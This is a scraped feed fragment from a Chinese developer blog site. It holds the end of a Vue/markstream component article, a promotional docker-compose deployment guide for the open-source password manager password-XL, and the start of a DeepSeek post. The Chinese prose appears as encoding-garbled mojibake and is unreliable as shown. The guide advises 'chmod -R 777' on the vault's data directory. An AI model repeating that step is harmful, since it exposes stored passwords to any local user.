<span class="hljs-comment">/* å¤§åˆ—è¡¨æ»šåŠ¨åˆ°è§†å£æ—¶ï¼ŒåµŒå¥— NodeRenderer éœ€è¦ç«‹å³ç»˜åˆ¶å†…å®¹ï¼Œé¿å…ç©ºç™½ */</span>
<span class="hljs-selector-class">.list-item</span> :<span class="hljs-built_in">deep</span>(.markdown-renderer) {
  <span class="hljs-attribute">content-visibility</span>: visible;
  <span class="hljs-attribute">contain</span>-intrinsic-size: <span class="hljs-number">0px</span> <span class="hljs-number">0px</span>;
  <span class="hljs-attribute">contain</span>: none;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-3">vmrç»„ä»¶</h3>
<p>é™¤äº†è¿™äº›åŸç”Ÿçš„htmlèŠ‚ç‚¹ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªå«vmrç»„ä»¶çš„ä¸œè¥¿ï¼Œå¯ä»¥æ¸²æŸ“ä¸€äº›è‡ªå®šä¹‰çš„ç»„ä»¶ï¼Œä½¿ç”¨æ–‡æ¡£å¯ä»¥çœ‹ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmarkstream-vue-docs.simonhe.me%2Fzh%2Fguide%2Fcomponents.html%23vmrcontainernode-%25E2%2580%2594-%25E8%2587%25AA%25E5%25AE%259A%25E4%25B9%2589-%25E5%25AE%25B9%25E5%2599%25A8" target="_blank" title="https://markstream-vue-docs.simonhe.me/zh/guide/components.html#vmrcontainernode-%E2%80%94-%E8%87%AA%E5%AE%9A%E4%B9%89-%E5%AE%B9%E5%99%A8" ref="nofollow noopener noreferrer">markstream-vue-docs.simonhe.me/zh/guide/coâ€¦</a></p>
<p>æˆ‘ä»¬è¦æ¥å—emitä¹Ÿæ˜¯åŒæ ·çš„é“ç†</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> vmrComponents = {
<span class="hljs-comment">// ä½ çš„ä¸€äº›ä¸šåŠ¡ç»„ä»¶</span>
}
<span class="hljs-title function_">setCustomComponents</span>(customIdComputed.<span class="hljs-property">value</span>, {
  <span class="hljs-comment">// ...</span>
  <span class="hljs-attr">vmr_container</span>: <span class="hljs-function">(<span class="hljs-params">{ node }: { node: <span class="hljs-built_in">any</span> }</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> component = props.<span class="hljs-property">vmrComponents</span>?.[node.<span class="hljs-property">name</span>] || (<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-string">'div'</span>, {}, <span class="hljs-string">'unknown component'</span>))
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">h</span>(component, {
      node,
      <span class="hljs-title function_">onEvent</span>(<span class="hljs-params">value: VmrComponentEvent</span>) {
        <span class="hljs-title function_">emits</span>(<span class="hljs-string">'event'</span>, value)
      },
    })
  },
})
</code></pre>
<p>å› ä¸ºæˆ‘æ˜¯å°†marksteamç»„ä»¶å°è£…å¤šäº†ä¸€å±‚ï¼Œä½œä¸ºå…¬å…±ç»„ä»¶ï¼Œæ‰€ä»¥æˆ‘å°±å°†æ‰€æœ‰ä¸šåŠ¡ç›¸å…³çš„äº‹ä»¶å°è£…åˆ°ä¸€ä¸ªemitäº‹ä»¶é‡Œé¢äº†ï¼Œç„¶åä½¿ç”¨tså¯¹äº‹ä»¶åšåŒºåˆ†ï¼Œå®ç°ç±»å‹æç¤ºï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">MarkdownComponentEvent</span> = <span class="hljs-title class_">EventA</span> | <span class="hljs-title class_">EventB</span>

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">EventA</span> {
  <span class="hljs-attr">eventName</span>: <span class="hljs-string">'a'</span>
  <span class="hljs-attr">eventValue</span>: {
    <span class="hljs-comment">// ...</span>
  }
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">EventB</span> {
  <span class="hljs-attr">eventName</span>: <span class="hljs-string">'b'</span>
  <span class="hljs-attr">eventValue</span>: {
    <span class="hljs-comment">// ...</span>
  }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‘Šåˆ«å¯†ç ç„¦è™‘ï¼å¼€æºå¯†ç ç¥å™¨ password-XLï¼šå®‰å…¨ã€ç¾è§‚ã€å…¨èƒ½çš„ç§æœ‰å¯†ç ç®¡å®¶]]></title>    <link>https://juejin.cn/post/7595053284914692136</link>    <guid>https://juejin.cn/post/7595053284914692136</guid>    <pubDate>2026-01-14T14:34:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595053284914692136" data-draft-id="7594851429163040802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‘Šåˆ«å¯†ç ç„¦è™‘ï¼å¼€æºå¯†ç ç¥å™¨ password-XLï¼šå®‰å…¨ã€ç¾è§‚ã€å…¨èƒ½çš„ç§æœ‰å¯†ç ç®¡å®¶"/> <meta itemprop="keywords" content="å¼€æº"/> <meta itemprop="datePublished" content="2026-01-14T14:34:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¿®å·±xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‘Šåˆ«å¯†ç ç„¦è™‘ï¼å¼€æºå¯†ç ç¥å™¨ password-XLï¼šå®‰å…¨ã€ç¾è§‚ã€å…¨èƒ½çš„ç§æœ‰å¯†ç ç®¡å®¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¿®å·±xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:34:49.000Z" title="Wed Jan 14 2026 14:34:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨è¿™ä¸ªæ•°å­—åŒ–çš„æ—¶ä»£ï¼Œæˆ‘ä»¬æ¯ä¸ªäººå·¥ä½œæˆ–è€…å­¦ä¹ ä¸­éƒ½éœ€è¦è®°ä½æ•°åç”šè‡³ä¸Šç™¾ä¸ªè´¦å·å¯†ç ã€‚å†™åœ¨æ–‡æ¡£æˆ–è€…çº¸ä¸Šå®¹æ˜“ä¸¢ï¼Œä½¿ç”¨å•†ä¸šå¯†ç ç®¡ç†å™¨åˆè¦èŠ±é’±â€¦â€¦å¦‚æœä½ ä¹Ÿæœ‰è¿™äº›å›°æ‰°ï¼Œé‚£ä¹ˆä»Šå¤©æˆ‘è¦ä»‹ç»çš„è¿™ä¸ªå¼€æºé¡¹ç›®ï¼Œå¯èƒ½ä¼šæˆä¸ºä½ çš„å·¥ä½œç”Ÿæ´»ä¸­çš„ç®¡å®¶ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/216d258b9f174af9a4cd725574407f48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006089&amp;x-signature=xufxWlAxUXphbqv0Jfzpdf%2Bccb8%3D" alt="password-xl-logo.md.png" loading="lazy"/></p>
<p>password-xl-logo.md.png</p>
<h2 data-id="heading-0">ğŸš€ è®¤è¯† password-XLï¼šä½ çš„ç§æœ‰å¯†ç ç®¡å®¶</h2>
<p><strong>password-XL</strong> æ˜¯ä¸€æ¬¾ å¼€æºçš„å¯†ç ç®¡ç†å·¥å…·ï¼Œä¸“æ³¨äºï¼š</p>
<ul>
<li>ğŸ” å®‰å…¨å¯é ï¼šæ”¯æŒç§æœ‰éƒ¨ç½²ï¼Œæ•°æ®å®Œå…¨ç”±ç”¨æˆ·æŒæ§</li>
<li>ğŸ¨ ç•Œé¢ç¾è§‚ï¼šç°ä»£åŒ– UIï¼Œæ”¯æŒå¤šç«¯ä½¿ç”¨</li>
<li>ğŸ§© åŠŸèƒ½ä¸°å¯Œï¼šè¦†ç›–ä¸ªäººä¸å›¢é˜Ÿå¸¸è§å¯†ç ç®¡ç†åœºæ™¯</li>
<li>ğŸ  éƒ¨ç½²çµæ´»ï¼šæ”¯æŒå®˜ç½‘å³ç”¨ã€Dockerã€Jarã€NAS ç­‰å¤šç§éƒ¨ç½²æ–¹å¼</li>
</ul>
<p>æ— è®ºæ˜¯ä¸ªäººä½¿ç”¨ï¼Œè¿˜æ˜¯åœ¨ NAS / æœåŠ¡å™¨ä¸­è‡ªå»ºç§æœ‰å¯†ç åº“ï¼Œpassword-XL éƒ½å¯ä»¥æ»¡è¶³ä½ çš„éœ€æ±‚ã€‚</p>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpeng0105%2Fpassword-xl" target="_blank" title="https://github.com/peng0105/password-xl" ref="nofollow noopener noreferrer">github.com/peng0105/paâ€¦</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43e187bf67724dbb9e69e8359fd3fabe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006089&amp;x-signature=cjMoE%2BnQ43SR8ircSmb05XX4Hgw%3D" alt="password-xj-github.png" loading="lazy"/></p>
<p>password-xj-github.png</p>
<h2 data-id="heading-1">ğŸ³ docker-composeéƒ¨ç½²</h2>
<p>æ­¤é¡¹ç›®ä½¿ç”¨dockeræ•´ä½“éƒ¨ç½²è¾ƒä¸ºç®€å•</p>
<h3 data-id="heading-2">ç¬¬ä¸€æ­¥ï¼š åˆ›å»ºdocker-compose.ymlæ–‡ä»¶</h3>
<p>åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºéƒ¨ç½²ç›®å½• <code>password-xj</code>,åœ¨æ­¤ç›®å½•ä¸‹åˆ›å»ºdocker-compose.ymlæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">services:</span>
  <span class="hljs-attr">password-xl-service:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">ccr.ccs.tencentyun.com/password-xl/password-xl-service:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">password-xl-service</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"9080:8080"</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./data:/password-xl-service</span>
</code></pre>
<h3 data-id="heading-3">ç¬¬äºŒæ­¥ï¼š å¯åŠ¨å®¹å™¨ï¼Œä¿®æ”¹æŒ‚è½½ç›®å½•æƒé™</h3>
<p>åœ¨docker-compose.ymlçš„åŒçº§ç›®å½•ä¸‹ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨å®¹å™¨</p>
<pre><code class="hljs">docker-compose up -d
</code></pre>
<p>å¯åŠ¨ä¹‹åä¿®æ”¹æŒ‚è½½ç›®å½•æƒé™</p>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">chmod</span> -R 777 ./data
</code></pre>
<p>æŸ¥çœ‹å¯åŠ¨æ—¥å¿—</p>
<pre><code class="hljs">docker-compose logs -f
</code></pre>
<p>å¯åŠ¨æ—¥å¿—ä¸­æœ‰åˆå§‹è¯çš„ä¸»å¯†ç å’Œç”¨æˆ·ï¼Œéœ€è¦è®°ä½ï¼Œåœ¨ç™»å½•çš„æ—¶å€™ä½¿ç”¨</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/435000bd32024e5b8672f51a9338e8ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006089&amp;x-signature=VTdkTNW7N0OvbF1J84eGSdJRiVs%3D" alt="password-xl-start-log.png" loading="lazy"/></p>
<p>password-xl-start-log.png</p>
<p>åˆ°æ­¤ï¼Œæˆ‘ä»¬çš„æœåŠ¡å°±éƒ¨ç½²å®Œäº†</p>
<h2 data-id="heading-4">ğŸ’» ä½¿ç”¨</h2>
<p>åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€æˆ‘ä»¬çš„æœåŠ¡åœ°å€è®¿é—®æœåŠ¡<a href="https://link.juejin.cn?target=http%3A%2F%2Fip%3Aport" target="_blank" title="http://ip:port" ref="nofollow noopener noreferrer">http://ip:port</a></p>
<h3 data-id="heading-5">ç™»å½•</h3>
<p>åœ¨ç™»å½•é¡µä½¿ç”¨ç§æœ‰æœåŠ¡ç™»å½•ï¼Œè´¦å·å¯†ç åœ¨å¯åŠ¨æ—¥å¿—ä¸­æœ‰æ‰“å° <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fdb4da9cdbc444e7a838308cb9da44b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006089&amp;x-signature=FHQcpCyKjwhR0TU8IDk4%2BThkm2s%3D" alt="password-xk-login.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb78f6378f05442b935fceb7db58526e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006089&amp;x-signature=5LoPuI78eO5QtBCJtTTTwKa4CRY%3D" alt="password-xj-login-serve.png" loading="lazy"/></p>
<p>password-xj-login-serve.png</p>
<p>ç™»å½•ä¹‹åéœ€è¦è®¾ç½®å›¾å½¢å¯†ç </p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/377bff09f87e4e3f83d519015c68463d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006089&amp;x-signature=c4i3CQRMkKwVaBt76U9CvuMpz0U%3D" alt="password-xl-imagep.png" loading="lazy"/></p>
<p>password-xl-imagep.png</p>
<h3 data-id="heading-6">ä½¿ç”¨</h3>
<p>æ­£å¸¸ä½¿ç”¨è¾ƒä¸ºç®€å•ï¼Œæœ‰å¯†ç å’Œç¬”è®°</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf50c98e85f84df0bf0d505c986edb1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006089&amp;x-signature=6CNESCCfRnKBRKOHBV19mvE9m1Q%3D" alt="password-xl-padd.png" loading="lazy"/></p>
<p>password-xl-padd.png</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2bc2ed80e9db4e8db869a1281f1cb72f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006089&amp;x-signature=3tF3e6fanwhPB1C0OFTGGRnKoHY%3D" alt="password-xl-list.png" loading="lazy"/></p>
<p>password-xl-list.png</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9408352e4e244811871284e07fd7eac2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006089&amp;x-signature=4ac%2FakDcLYhU8B4QvQ36rmkArL0%3D" alt="password-xl-note.png" loading="lazy"/></p>
<p>password-xl-note.png</p>
<h3 data-id="heading-7">ä¿®æ”¹ç”¨æˆ·åŠä¸»å¯†ç </h3>
<p>é¡µé¢ä¸Šä¸æ”¯æŒä¿®æ”¹ä¸»å¯†ç åŠç”¨æˆ·ï¼Œè‹¥éœ€è¦ä¿®æ”¹ä¸»å¯†ç åŠç”¨æˆ·ï¼Œåˆ™éœ€è¦ä¿®æ”¹æœåŠ¡æŒ‚è½½ç›®å½•ä¸‹çš„<code>password-xl.toml</code>æ–‡ä»¶ä¸­çš„ä¿¡æ¯ï¼Œç„¶åé‡å¯å®¹å™¨å³å¯ç”Ÿæ•ˆ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ec47691e281467b958834c1a287f130~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006089&amp;x-signature=zJqD1FkEY33W4zhzIWM%2BcAQnrsw%3D" alt="password-xl-puinfo.png" loading="lazy"/></p>
<p>password-xl-puinfo.png</p>
<h2 data-id="heading-8">ğŸ’ç»“è¯­</h2>
<p>password-XLæ˜¯ä¸€æ¬¾æå…·æ½œåŠ›çš„å¼€æºå¯†ç ç®¡ç†å·¥å…·ï¼Œå®ƒåœ¨éšç§ä¿æŠ¤ã€æˆæœ¬æ§åˆ¶å’ŒæŠ€æœ¯åˆ›æ–°æ–¹é¢è¡¨ç°å‡ºè‰²ï¼Œç‰¹åˆ«é€‚åˆå¯¹æ•°æ®ä¸»æƒæœ‰è¦æ±‚çš„ç”¨æˆ·ã€‚</p>
<p>ç„¶è€Œï¼Œä¸æˆç†Ÿçš„å•†ä¸šäº§å“ç›¸æ¯”ï¼Œåœ¨ç”¨æˆ·ä½“éªŒã€ç”Ÿæ€å®Œå–„åº¦å’Œä¼ä¸šåŠŸèƒ½æ–¹é¢ä»æœ‰æå‡ç©ºé—´ã€‚å¯¹äºæ™®é€šç”¨æˆ·ï¼Œå¦‚æœä¸æ€•æŠ˜è…¾ä¸”é‡è§†éšç§ï¼Œpassword-XLæ˜¯ç»ä½³é€‰æ‹©ï¼›å¯¹äºè¿½æ±‚æè‡´ä¾¿åˆ©å’Œå…¨é¢åŠŸèƒ½çš„ä¼ä¸šç”¨æˆ·ï¼Œå¯èƒ½éœ€è¦ç­‰å¾…å…¶è¿›ä¸€æ­¥å‘å±•ã€‚</p>
<p>æ€»çš„æ¥è¯´ï¼Œpassword-XLä»£è¡¨ç€å¼€æºå¯†ç ç®¡ç†å·¥å…·çš„æ­£ç¡®æ–¹å‘â€”â€”å®‰å…¨ã€å¯æ§ã€é€æ˜ã€‚ éšç€ç¤¾åŒºçš„å£®å¤§å’ŒåŠŸèƒ½çš„å®Œå–„ï¼Œå®ƒæœ‰æœ›æˆä¸ºæ›´å¤šäººä¿¡èµ–çš„å¯†ç ç®¡ç†è§£å†³æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-9">â—â—â— é‡è¦å®‰å…¨æç¤º</h2>
<blockquote>
<p>[!NOTE] ã€é‡è¦å®‰å…¨æç¤ºã€‘è¯·åŠ¡å¿…å¦¥å–„ä¿ç®¡ä¸ªäººé“¶è¡Œå¡å¯†ç åŠé‡è¦è½¯ä»¶å¯†ç ï¼Œåˆ‡å‹¿å‘ä»–äººæ³„éœ²æˆ–ä½¿ç”¨ç®€å•æ˜“çŒœçš„å¯†ç ç»„åˆã€‚å®šæœŸæ›´æ¢å¯†ç ï¼Œé¿å…å¤šè´¦æˆ·å…±ç”¨åŒä¸€å¯†ç ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸é æ¨¡ä»¿çš„ç¬¬ä¸‰æ¡è·¯ï¼šDeepSeek å‡­æ•°å­¦æ¨å¯¼ï¼Œä¸ºä½•æ’ä¸Š Google çš„å·¥ç¨‹ç›´è§‰ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7595034434976497702</link>    <guid>https://juejin.cn/post/7595034434976497702</guid>    <pubDate>2026-01-14T14:38:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595034434976497702" data-draft-id="7595030559564955699" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸é æ¨¡ä»¿çš„ç¬¬ä¸‰æ¡è·¯ï¼šDeepSeek å‡­æ•°å­¦æ¨å¯¼ï¼Œä¸ºä½•æ’ä¸Š Google çš„å·¥ç¨‹ç›´è§‰ï¼Ÿ"/> <meta itemprop="keywords" content="LLM"/> <meta itemprop="datePublished" content="2026-01-14T14:38:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ™ºæ³ŠAI"/> <meta itemprop="url" content="https://juejin.cn/user/3572727470361578"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸é æ¨¡ä»¿çš„ç¬¬ä¸‰æ¡è·¯ï¼šDeepSeek å‡­æ•°å­¦æ¨å¯¼ï¼Œä¸ºä½•æ’ä¸Š Google çš„å·¥ç¨‹ç›´è§‰ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3572727470361578/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ™ºæ³ŠAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:38:53.000Z" title="Wed Jan 14 2026 14:38:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
